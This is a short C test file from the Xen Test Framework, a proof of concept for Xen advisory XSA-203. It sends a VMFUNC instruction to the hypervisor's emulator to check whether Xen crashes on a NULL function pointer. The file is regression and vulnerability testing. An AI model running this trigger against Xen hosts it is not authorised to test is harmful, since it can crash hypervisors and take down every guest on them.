/**
 * @file tests/xsa-203/main.c
 * @ref test-xsa-203
 *
 * @page test-xsa-203 XSA-203
 *
 * Advisory: [XSA-203](http://xenbits.xen.org/xsa/advisory-203.html)
 *
 * Versions of Xen between 4.6 (when VMFUNC support was introduced) and
 * XSA-203, would follow a NULL function pointer on non-Intel hardware.
 *
 * Poke a VMFUNC at the instruction emulator, and see whether Xen falls over.
 *
 * @see tests/xsa-203/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-203 PoC";

bool test_needs_fep = true;

void test_main(void)
{
    asm volatile (_ASM_XEN_FEP
                  "1:"
                  ".byte 0x0f, 0x01, 0xd4;" /* VMFUNC */
                  "2:"
                  _ASM_EXTABLE(1b, 2b) /* Ignore #UD on older versions. */
                  :: "a" (0));

    /* If Xen is alive, it didn't fall over the NULL function pointer. */
    xtf_success("Success: Not vulnerable to XSA-203\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
